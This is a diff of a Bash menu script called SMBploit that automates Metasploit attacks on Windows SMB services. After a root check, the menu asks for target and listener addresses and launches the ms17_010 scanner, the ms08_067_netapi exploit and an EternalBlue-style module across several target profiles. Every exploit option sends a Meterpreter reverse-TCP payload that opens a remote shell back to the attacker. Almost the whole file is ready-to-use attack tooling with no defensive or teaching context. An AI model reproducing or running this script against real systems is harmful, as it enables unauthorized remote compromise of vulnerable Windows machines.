@@ -12,7 +12,7 @@ a="\033[1;33m"
 nc="\e[0m"
 
 #var
-shell="SMBploit"
+shell=🡆
 n0=0
 n1=1
 n2=2
@@ -22,11 +22,40 @@ n5=5
 n6=6
 n7=7
 n8=8
+si=✔
+no=x
+
+clear
+
+function checkroot(){
+	    echo ""
+	    echo -e "$a check root user $nc"
+	    sleep 4
+	if [ "$(id -u)" == "0" ]; then
+	    echo ""
+	    echo -e " $b[$v$si$b] root $nc"
+	    sleep 4
+	    echo ""
+	    echo -e "$a Initializing SMBploit $nc"
+	    sleep 4
+	    echo ""
+    else
+        echo ""
+	    echo -e " $b[$r$no$b] root $nc"
+	    sleep 4
+	    echo ""
+	    echo -e "$a exiting $nc"
+	    sleep 4
+	    echo ""
+	    exit
+	fi	
+}
+
+checkroot
 
 #serv
 service postgresql start
 clear
-sleep 1
 
 function banner(){
        echo -e "$b ┌══════════════════════════════════════════┐"
@@ -56,194 +85,195 @@ function banner(){
 }
 
 function menu(){
-read -p " $(echo -e $r[$v$shell$a:$b~$r]$v# $nc)" opc
-if [ $opc -eq 0 ]; then
-	echo ""
-	echo -e "$a ¿RHOST?$nc"
-	echo ""
-	read rhost
-	echo ""
-	clear
-	echo -e "$a Scan IP:$v $rhost $nc"
-	echo ""
-	msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010;
-	set RHOSTS $rhost;
-	run;
-	exit; "
-	echo ""
-	sleep 1
-	banner
-	menu
-elif [ $opc -eq 1 ]; then
-	echo ""
-	echo -e "$a ¿LHOST?$nc"
-	echo ""
-	read lhost
-	echo ""
-	echo -e "$a ¿RHOST?$nc"
-	echo ""
-	read rhost
-	echo ""
-	msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
-	set PAYLOAD windows/meterpreter/reverse_tcp;
-	set RHOSTS $rhost;
-	set LHOST $lhost;
-	exploit;
-	exit; "
-	echo ""
-	sleep 5
-	clear
-	sleep 1
-	banner
-	menu
-elif [ $opc -eq 2 ]; then
+read -p " $(echo -e $v$shell $nc)" opc
+
+    if [ $opc -eq 0 ]; then
+	    echo ""
+	    echo -e "$a ¿RHOST?$nc"
+	    echo ""
+	    read rhost
+	    echo ""
+	    clear
+	    echo -e "$a Scan IP:$v $rhost $nc"
+	    echo ""
+	    msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010;
+	    set RHOSTS $rhost;
+	    run;
+	    exit; "
+	    echo ""
+	    sleep 1
+	    banner
+	    menu
+    elif [ $opc -eq 1 ]; then
+	    echo ""
+	    echo -e "$a ¿LHOST?$nc"
+	    echo ""
+	    read lhost
+	    echo ""
+	    echo -e "$a ¿RHOST?$nc"
+	    echo ""
+	    read rhost
+	    echo ""
+	    msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
+	    set PAYLOAD windows/meterpreter/reverse_tcp;
+	    set RHOSTS $rhost;
+	    set LHOST $lhost;
+	    exploit;
+	    exit; "
+	    echo ""
+	    sleep 5
+	    clear
+	    sleep 1
+	    banner
+	    menu
+    elif [ $opc -eq 2 ]; then
         echo ""
-	echo -e "$a ¿LHOST?$nc"
-	echo ""
-	read lhost
-	echo ""
-	echo -e "$a ¿RHOST?$nc"
-	echo ""
-	read rhost
-	echo ""
-	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-	set PAYLOAD windows/meterpreter/reverse_tcp;
-	set RHOSTS $rhost;
-	set LHOST $lhost;
-	set target 4;
-	set TARGETARCHITECTURE x86;
-	exploit;
-	exit; "
-	echo ""
-	sleep 5
-	clear
-	sleep 1
-	banner
-	menu
-elif [ $opc -eq 3 ]; then
+	    echo -e "$a ¿LHOST?$nc"
+	    echo ""
+	    read lhost
+	    echo ""
+	    echo -e "$a ¿RHOST?$nc"
+	    echo ""
+	    read rhost
+	    echo ""
+	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    set PAYLOAD windows/meterpreter/reverse_tcp;
+	    set RHOSTS $rhost;
+	    set LHOST $lhost;
+	    set target 4;
+	    set TARGETARCHITECTURE x86;
+	    exploit;
+	    exit; "
+	    echo ""
+	    sleep 5
+	    clear
+	    sleep 1
+	    banner
+	    menu
+    elif [ $opc -eq 3 ]; then
         echo ""
-	echo -e "$a ¿LHOST?$nc"
-	echo ""
-	read lhost
-	echo ""
-	echo -e "$a ¿RHOST?$nc"
-	echo ""
-	read rhost
-	echo ""
-	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-	set PAYLOAD windows/x64/meterpreter/reverse_tcp;
-	set RHOSTS $rhost;
-	set LHOST $lhost;
-	set target 5;
-	set TARGETARCHITECTURE x64;
-	exploit;
-	exit; "
-	echo ""
-	sleep 5
-	clear
-	sleep 1
-	banner
-	menu
-elif [ $opc -eq 4 ]; then
+	    echo -e "$a ¿LHOST?$nc"
+	    echo ""
+	    read lhost
+	    echo ""
+	    echo -e "$a ¿RHOST?$nc"
+	    echo ""
+	    read rhost
+	    echo ""
+	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
+	    set RHOSTS $rhost;
+	    set LHOST $lhost;
+	    set target 5;
+	    set TARGETARCHITECTURE x64;
+	    exploit;
+	    exit; "
+	    echo ""
+	    sleep 5
+	    clear
+	    sleep 1
+	    banner
+	    menu
+    elif [ $opc -eq 4 ]; then
         echo ""
-	echo -e "$a ¿LHOST?$nc"
-	echo ""
-	read lhost
-	echo ""
-	echo -e "$a ¿RHOST?$nc"
-	echo ""
-	read rhost
-	echo ""
-	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-	set PAYLOAD windows/meterpreter/reverse_tcp;
-	set RHOSTS $rhost;
-	set LHOST $lhost;
-	set target 7;
-	set TARGETARCHITECTURE x86;
-	exploit;
-	exit; "
+	    echo -e "$a ¿LHOST?$nc"
+	    echo ""
+	    read lhost
+	    echo ""
+	    echo -e "$a ¿RHOST?$nc"
+	    echo ""
+	    read rhost
+	    echo ""
+	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    set PAYLOAD windows/meterpreter/reverse_tcp;
+	    set RHOSTS $rhost;
+	    set LHOST $lhost;
+	    set target 7;
+	    set TARGETARCHITECTURE x86;
+	    exploit;
+	    exit; "
         echo ""
-	sleep 5
-	clear
-	sleep 1
-	banner
-	menu
-elif [ $opc -eq 5 ]; then
+	    sleep 5
+	    clear
+	    sleep 1
+	    banner
+	    menu
+    elif [ $opc -eq 5 ]; then
         echo ""
-	echo -e "$a ¿LHOST?$nc"
-	echo ""
-	read lhost
-	echo ""
-	echo -e "$a ¿RHOST?$nc"
-	echo ""
-	read rhost
-	echo ""
-	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-	set PAYLOAD windows/x64/meterpreter/reverse_tcp;
-	set RHOSTS $rhost;
-	set LHOST $lhost;
-	set target 7;
-	set TARGETARCHITECTURE x64;
-	exploit;
-	exit; "
-	echo ""
-	sleep 5
-	clear
-	sleep 1
-	banner
-	menu
-elif [ $opc -eq 6 ]; then
+	    echo -e "$a ¿LHOST?$nc"
+	    echo ""
+	    read lhost
+	    echo ""
+	    echo -e "$a ¿RHOST?$nc"
+	    echo ""
+	    read rhost
+	    echo ""
+	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
+	    set RHOSTS $rhost;
+	    set LHOST $lhost;
+	    set target 7;
+	    set TARGETARCHITECTURE x64;
+	    exploit;
+	    exit; "
+	    echo ""
+	    sleep 5
+	    clear
+	    sleep 1
+	    banner
+	    menu
+    elif [ $opc -eq 6 ]; then
         echo ""
-	echo -e "$a ¿LHOST?$nc"
-	echo ""
-	read lhost
-	echo ""
-	echo -e "$a ¿RHOST?$nc"
-	echo ""
-	read rhost
-	echo ""
-	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-	set PAYLOAD windows/meterpreter/reverse_tcp;
-	set RHOSTS $rhost;
-	set LHOST $lhost;
-	set target 8;
-	set TARGETARCHITECTURE x86;
-	exploit;
-	exit; "
-	echo ""
-	sleep 5
-	clear
-	sleep 1
-	banner
-	menu
-elif [ $opc -eq 7 ]; then
+	    echo -e "$a ¿LHOST?$nc"
+	    echo ""
+	    read lhost
+	    echo ""
+	    echo -e "$a ¿RHOST?$nc"
+	    echo ""
+	    read rhost
+	    echo ""
+	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    set PAYLOAD windows/meterpreter/reverse_tcp;
+	    set RHOSTS $rhost;
+	    set LHOST $lhost;
+	    set target 8;
+	    set TARGETARCHITECTURE x86;
+	    exploit;
+	    exit; "
+	    echo ""
+	    sleep 5
+	    clear
+	    sleep 1
+	    banner
+	    menu
+    elif [ $opc -eq 7 ]; then
         echo ""
-	echo -e "$a ¿LHOST?$nc"
-	echo ""
-	read lhost
-	echo ""
-	echo -e "$a ¿RHOST?$nc"
-	echo ""
-	read rhost
-	echo ""
-	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-	set PAYLOAD windows/x64/meterpreter/reverse_tcp;
-	set RHOSTS $rhost;
-	set LHOST $lhost;
-	set target 8;
-	set TARGETARCHITECTURE x64;
-	exploit;
-	exit; "
-	echo ""
-	sleep 5
-	clear
-	sleep 1
-	banner
-	menu
-elif [ $opc -eq 8 ]; then
-	echo ""
-	echo ""
-	echo -e "$a        |\/\/\/|"
+	    echo -e "$a ¿LHOST?$nc"
+	    echo ""
+	    read lhost
+	    echo ""
+	    echo -e "$a ¿RHOST?$nc"
+	    echo ""
+	    read rhost
+	    echo ""
+	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
+	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
+	    set RHOSTS $rhost;
+	    set LHOST $lhost;
+	    set target 8;
+	    set TARGETARCHITECTURE x64;
+	    exploit;
+	    exit; "
+	    echo ""
+	    sleep 5
+	    clear
+	    sleep 1
+	    banner
+	    menu
+    elif [ $opc -eq 8 ]; then
+	    echo ""
+	    echo ""
+	    echo -e "$a        |\/\/\/|"
         echo -e "        |      |" 
         echo -e "        |      |" 
         echo -e "        | (o)(o) " 
@@ -255,18 +285,19 @@ elif [ $opc -eq 8 ]; then
         echo -e "$b#### $v BYE $v HACKER $b ####"
         echo ""
         echo ""
-	sleep 3
-	exit
-else
-	echo ""
-	echo -e "$a invalid option $nc"
-	echo ""
-	sleep 2
-	clear
-	sleep 1
-	banner
-	menu
-fi
+	    sleep 3
+	    exit
+    else
+	    echo ""
+	    echo -e "$a invalid option $nc"
+	    echo ""
+	    sleep 2
+	    clear
+	    sleep 1
+	    banner
+	    menu
+    fi
 }
+
 banner
 menu
